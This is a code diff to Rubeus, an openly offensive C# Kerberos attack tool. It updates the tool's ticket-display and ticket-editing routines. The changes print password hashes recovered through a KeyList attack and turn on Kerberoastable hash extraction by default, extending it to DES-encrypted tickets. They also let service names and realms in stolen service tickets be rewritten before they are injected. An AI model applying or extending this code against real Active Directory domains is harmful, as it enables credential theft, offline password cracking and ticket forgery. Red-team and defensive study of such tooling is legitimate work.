@@ -68,7 +68,7 @@ namespace Rubeus
             LSAString.MaximumLength = (ushort)(logonProcessName.Length + 1);
             LSAString.Buffer = logonProcessName;
 
-            var ret = Interop.LsaRegisterLogonProcess(LSAString, out lsaHandle, out securityMode);
+            var ret = Interop.LsaRegisterLogonProcess(ref LSAString, out lsaHandle, out securityMode);
 
             return lsaHandle;
         }
@@ -234,7 +234,7 @@ namespace Rubeus
             //      and finally uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
             //      to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)
 
-            //  For elevated enumeration, the code first uses LsaConnectUntrusted() to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type
+            //  For non-elevated enumeration, the code first uses LsaConnectUntrusted() to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type
             //      to enumerate all cached tickets, then uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
             //      to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)
 
@@ -519,7 +519,7 @@ namespace Rubeus
             }
         }
 
-        public static void DisplayTicket(KRB_CRED cred, int indentLevel = 2, bool displayTGT = false, bool displayB64ticket = false, bool extractKerberoastHash = false, bool nowrap = false, byte[] serviceKey = null, byte[] asrepKey = null, string serviceUser = "", string serviceDomain = "", byte[] krbKey = null)
+        public static void DisplayTicket(KRB_CRED cred, int indentLevel = 2, bool displayTGT = false, bool displayB64ticket = false, bool extractKerberoastHash = true, bool nowrap = false, byte[] serviceKey = null, byte[] asrepKey = null, string serviceUser = "", string serviceDomain = "", byte[] krbKey = null, byte[] keyList = null, string desPlainText = "")
         {
             // displays a given .kirbi (KRB_CRED) object, with display options
 
@@ -531,9 +531,11 @@ namespace Rubeus
             //  nowrap                  -   don't wrap base64 ticket output
 
             var userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
+            var principalType = cred.enc_part.ticket_info[0].pname.name_type.ToString();
             var sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());
             var keyType = String.Format("{0}", (Interop.KERB_ETYPE)cred.enc_part.ticket_info[0].key.keytype);
-            var b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);        
+            var b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);
+            var eType = (Interop.KERB_ETYPE)cred.tickets[0].enc_part.etype;
             var base64ticket = Convert.ToBase64String(cred.Encode().Encode());
             string indent = new string(' ', indentLevel);
             string serviceName = sname.Split('/')[0];
@@ -566,7 +568,7 @@ namespace Rubeus
                 // full display with session key
                 Console.WriteLine("\r\n{0}ServiceName              :  {1}", indent, sname);
                 Console.WriteLine("{0}ServiceRealm             :  {1}", indent, cred.enc_part.ticket_info[0].srealm);
-                Console.WriteLine("{0}UserName                 :  {1}", indent, userName);
+                Console.WriteLine("{0}UserName                 :  {1}", indent, $"{userName} ({principalType})");
                 Console.WriteLine("{0}UserRealm                :  {1}", indent, cred.enc_part.ticket_info[0].prealm);
                 Console.WriteLine("{0}StartTime                :  {1}", indent, cred.enc_part.ticket_info[0].starttime.ToLocalTime());
                 Console.WriteLine("{0}EndTime                  :  {1}", indent, cred.enc_part.ticket_info[0].endtime.ToLocalTime());
@@ -574,12 +576,25 @@ namespace Rubeus
                 Console.WriteLine("{0}Flags                    :  {1}", indent, cred.enc_part.ticket_info[0].flags);
                 Console.WriteLine("{0}KeyType                  :  {1}", indent, keyType);
                 Console.WriteLine("{0}Base64(key)              :  {1}", indent, b64Key);
+                                  
+                // If KeyList attack then present the password hash
+                if (keyList != null)
+                {
+                    Console.WriteLine("{0}Password Hash            :  {2}", indent, userName, Helpers.ByteArrayToString(keyList));
+                }
 
                 //We display the ASREP decryption key as this is needed for decrypting
                 //PAC_CREDENTIAL_INFO inside both the AS-REP and TGS-REP Tickets when
                 //PKINIT is used
                 if (asrepKey != null)
                     Console.WriteLine("{0}ASREP (key)              :  {1}", indent, Helpers.ByteArrayToString(asrepKey));
+
+                // Display RODC number, for when a TGT is requested from an RODC
+                if (cred.tickets[0].enc_part.kvno > 65535)
+                {
+                    uint rodcNum = cred.tickets[0].enc_part.kvno >> 16;
+                    Console.WriteLine("{0}RODC Number              :  {1}", indent, rodcNum);
+                }
 
                 if (displayB64ticket)
                 {
@@ -601,15 +616,15 @@ namespace Rubeus
                 else if (extractKerberoastHash && (serviceName != "krbtgt"))
                 {
                     // if this isn't a TGT, try to display a Kerberoastable hash
-                    if (!keyType.Equals("rc4_hmac") && !keyType.Equals("aes256_cts_hmac_sha1"))
+                    if (!eType.Equals(Interop.KERB_ETYPE.rc4_hmac) && !eType.Equals(Interop.KERB_ETYPE.aes256_cts_hmac_sha1) && !eType.Equals(Interop.KERB_ETYPE.des_cbc_md5))
                     {
                         // can only display rc4_hmac as it doesn't have a salt. DES/AES keys require the user/domain as a salt,
                         //      and we don't have the user account name that backs the requested SPN for the ticket, no no dice :(
-                        Console.WriteLine("\r\n[!] Service ticket uses encryption key type '{0}', unable to extract hash and salt.", keyType);
+                        Console.WriteLine("\r\n[!] Service ticket uses encryption type '{0}', unable to extract hash and salt.", eType);
                     }
-                    else if (keyType.Equals("rc4_hmac"))
+                    else if (eType.Equals(Interop.KERB_ETYPE.rc4_hmac) || eType.Equals(Interop.KERB_ETYPE.des_cbc_md5))
                     {
-                        Roast.DisplayTGShash(cred);
+                        Roast.DisplayTGShash(cred, desPlainText: desPlainText);
                     }
                     else if (!String.IsNullOrEmpty(serviceUser))
                     {
@@ -634,7 +649,8 @@ namespace Rubeus
                 
                 try
                 {
-                    var decryptedEncTicket = cred.tickets[0].Decrypt(serviceKey, asrepKey);
+                    bool displayBlockOne = true;
+                    var decryptedEncTicket = cred.tickets[0].Decrypt(serviceKey, asrepKey, false, displayBlockOne);
                     PACTYPE pt = decryptedEncTicket.GetPac(asrepKey);
                     if (pt == null)
                     {
@@ -663,12 +679,17 @@ namespace Rubeus
                             Console.WriteLine("{0}  UpnDns                 :", indent);
                             Console.WriteLine("{0}    DNS Domain Name      : {1}", indent, upnDns.DnsDomainName);
                             Console.WriteLine("{0}    UPN                  : {1}", indent, upnDns.Upn);
-                            Console.WriteLine("{0}    Flags                : {1}", indent, upnDns.Flags);
+                            Console.WriteLine("{0}    Flags                : ({1}) {2}", indent, (int)upnDns.Flags, upnDns.Flags);
+                            if (upnDns.Flags.HasFlag(Interop.UpnDnsFlags.EXTENDED))
+                            {
+                                Console.WriteLine("{0}    SamName              : {1}", indent, upnDns.SamName);
+                                Console.WriteLine("{0}    Sid                  : {1}", indent, upnDns.Sid.Value);
+                            }
                         }
                         else if (pacInfoBuffer is SignatureData sigData)
                         {
                             string validation = "VALID";
-                            int i2 = 0;
+                            int i2 = 1;
                             if (sigData.Type == PacInfoBufferType.ServerChecksum && !validated.Item1)
                             {
                                 validation = "INVALID";
@@ -681,15 +702,23 @@ namespace Rubeus
                             {
                                 validation = "INVALID";
                             }
-                            else if ((sigData.Type == PacInfoBufferType.KDCChecksum || sigData.Type == PacInfoBufferType.TicketChecksum) && krbKey == null)
+                            else if (sigData.Type == PacInfoBufferType.FullPacChecksum && krbKey != null && !validated.Item4)
+                            {
+                                validation = "INVALID";
+                            }
+                            else if ((sigData.Type == PacInfoBufferType.KDCChecksum || sigData.Type == PacInfoBufferType.TicketChecksum || sigData.Type == PacInfoBufferType.FullPacChecksum) && krbKey == null)
                             {
                                 validation = "UNVALIDATED";
                             }
                             if (sigData.Type == PacInfoBufferType.KDCChecksum)
                             {
-                                i2 = 3;
+                                i2 = 4;
                             }
-                            Console.WriteLine("{0}  {1}         {2}:", indent, sigData.Type.ToString(), new string(' ', i2));
+                            else if (sigData.Type == PacInfoBufferType.FullPacChecksum)
+                            {
+                                i2 = 0;
+                            }
+                            Console.WriteLine("{0}  {1}        {2}:", indent, sigData.Type.ToString(), new string(' ', i2));
                             Console.WriteLine("{0}    Signature Type       : {1}", indent, sigData.SignatureType);
                             Console.WriteLine("{0}    Signature            : {1} ({2})", indent, Helpers.ByteArrayToString(sigData.Signature), validation);
                         }
@@ -827,7 +856,17 @@ namespace Rubeus
                             Console.WriteLine("{0}    TransitedListSize    : {1}", indent, s4u.s4u.TransitedListSize);
                             Console.WriteLine("{0}    S4UTransitedServices : {1}", indent, s4u.s4u.S4UTransitedServices.GetValue().Select(s => s.ToString()).Aggregate((cur, next) => cur + " <= " + next));
                         }
-
+                        else if (pacInfoBuffer is Requestor requestor)
+                        {
+                            Console.WriteLine("{0}  Requestor              :", indent);
+                            Console.WriteLine("{0}    RequestorSID         : {1}", indent, requestor.RequestorSID.ToString());
+                        }
+                        else if (pacInfoBuffer is Attributes att)
+                        {
+                            Console.WriteLine("{0}  Attributes             :", indent);
+                            Console.WriteLine("{0}    AttributeLength      : {1}", indent, att.Length);
+                            Console.WriteLine("{0}    AttributeFlags       : ({1}) {2}", indent, (int)att.Flags, att.Flags);
+                        }
                     }
                 }
                 catch
@@ -1527,7 +1566,7 @@ namespace Rubeus
             return finalTGTBytes;
         }
 
-        public static void SubstituteTGSSname(KRB_CRED kirbi, string altsname, bool ptt = false, LUID luid = new LUID())
+        public static void SubstituteTGSSname(KRB_CRED kirbi, string altsname, bool ptt = false, LUID luid = new LUID(), string srealm = "")
         {
             // subtitutes in an alternate servicename (sname) into a supplied service ticket
 
@@ -1537,17 +1576,27 @@ namespace Rubeus
             var parts = altsname.Split('/');
             if (parts.Length == 1)
             {
+                name_string.Add(altsname);
                 // sname alone
-                kirbi.tickets[0].sname.name_string[0] = parts[0]; // ticket itself
-                kirbi.enc_part.ticket_info[0].sname.name_string[0] = parts[0]; // enc_part of the .kirbi
+                kirbi.tickets[0].sname.name_string = name_string; // ticket itself
+                kirbi.enc_part.ticket_info[0].sname.name_string = name_string; // enc_part of the .kirbi
             }
-            else if (parts.Length == 2)
+            else if (parts.Length > 1)
             {
-                name_string.Add(parts[0]);
-                name_string.Add(parts[1]);
+                foreach (var part in parts)
+                {
+                    name_string.Add(part);
+                }
 
                 kirbi.tickets[0].sname.name_string = name_string; // ticket itself
                 kirbi.enc_part.ticket_info[0].sname.name_string = name_string; // enc_part of the .kirbi
+            }
+
+            if (!string.IsNullOrWhiteSpace(srealm))
+            {
+                Console.WriteLine("[*] Substituting in alternate service realm: {0}", srealm);
+                kirbi.tickets[0].realm = srealm.ToUpper();
+                kirbi.enc_part.ticket_info[0].srealm = srealm.ToUpper();
             }
 
             var kirbiBytes = kirbi.Encode().Encode();
